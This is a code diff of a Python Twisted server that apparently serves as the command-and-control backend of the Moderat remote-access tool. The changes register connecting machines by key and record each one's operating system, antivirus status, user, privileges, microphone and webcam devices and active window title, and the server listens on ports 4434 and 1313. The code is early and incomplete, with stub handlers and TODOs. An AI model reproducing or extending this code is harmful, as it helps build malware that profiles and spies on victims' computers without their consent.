@@ -14,44 +14,74 @@ class ModeratServerProtocol(Protocol):
 
     # New Connection Made
     def connectionMade(self):
-        print 'new connection'
         self.send_message_to_client(self, 'connectSuccess', 'welcome')
 
     def connectionLost(self, reason):
-        pass
+        self.factory.clients = {key: value for key, value in self.factory.clients.items() if value is not self}
 
     def dataReceived(self, data):
-        # Get Data
+        # Data Received
         command = self.recieve_message(data)
         # Switch to client commands
-        if command['source'] == 'client':
+        if command['from'] == 'client':
             self.client_commands(command['payload'], command['mode'])
         # Switch to moderator commands
-        elif command['source'] == 'moderator':
-            pass
+        elif command['from'] == 'moderator':
+            self.moderator_commands(command['payload'], command['mode'])
 
     def client_commands(self, payload, mode):
-        # Check client for keys
+
+        # Clients Initializing
         if mode == 'clientInitializing':
-            print payload
+
+            # If client has no key generate new one and send
             if payload == 'noKey':
-                print 'no key'
-                self.send_message_to_client(self, id_generator(), 'clientInitializing')
+                key = id_generator()
+                # TODO: Write Client db
+                self.send_message_to_client(self, key, 'clientInitializing')
+
+            # else get key from client
             else:
-                # TODO: Write db
-                self.send_message_to_client(self, id_generator(), 'clientInitializing')
-            print self.factory.clients
-            print 'New Connection from %s' % self.transport.getHost().host
+                key = payload
+                # TODO: Check DB
+                self.send_message_to_client(self, key, 'clientInitializing')
+            self.factory.clients[payload] = {
+                'id': key,
+                'sock': self,
+            }
+            print '[*] New Client from %s' % self.transport.getHost()
+
+        # Clients Status Checker
+        elif mode == 'infoChecker':
+            if self.factory.clients.has_key(payload['key']):
+                self.factory.clients[payload['key']] = {
+                    'ip_address':           self.transport.getHost().host,
+                    'ostype':               payload['os_type'],
+                    'os':                   payload['os'],
+                    'protection':           payload['protection'],
+                    'user':                 payload['user'],
+                    'privileges':           payload['privileges'],
+                    'inputdevice':          payload['audio_device'],
+                    'webcamdevice':         payload['webcamera_device'],
+                    'activewindowtitle':    payload['window_title'],
+                    'keypassword':          payload['key'],
+                }
+            else:
+                pass
+
+    def moderator_commands(self, payload, client_id):
+        print 'send'
 
     def recieve_message(self, data, end='[ENDOFMESSAGE]'):
         return ast.literal_eval(data[:-len(end)].decode('utf-8'))
 
-    def send_message_to_client(self, client, message, mode, end='[ENDOFMESSAGE]'):
+    def send_message_to_client(self, client, message, mode, _from='server', end='[ENDOFMESSAGE]'):
         # Send Data Function
         message = {
             'payload': message,
             'mode': mode,
-            'source': 'server',
+            'from': _from,
+            'to': '',
         }
         client.transport.write(str(message)+end)
 
@@ -65,24 +95,8 @@ class ModeratServerFactory(ServerFactory):
 
     def __init__(self):
         self.clients = {}
-        self.clients_checker = task.LoopingCall(self.check_for_clients)
-        self.clients_checker.start(10)
 
-    def check_for_clients(self):
-        for client in self.clients:
-            client.transport.write("10 seconds has passed\n")
-
-    def clientConnectionMade(self, id, client, ip_address):
-        if self.clients.has_key(id):
-            return
-        self.clients.append(client)
-
-    def clientConnectionLost(self, client):
-        self.clients.remove(client)
-
-#factory = Factory()
-#factory.protocol = ModeratServerProtocol
 
 reactor.listenTCP(4434, ModeratServerFactory())
-
+reactor.listenTCP(1313, ModeratServerFactory())
 reactor.run()
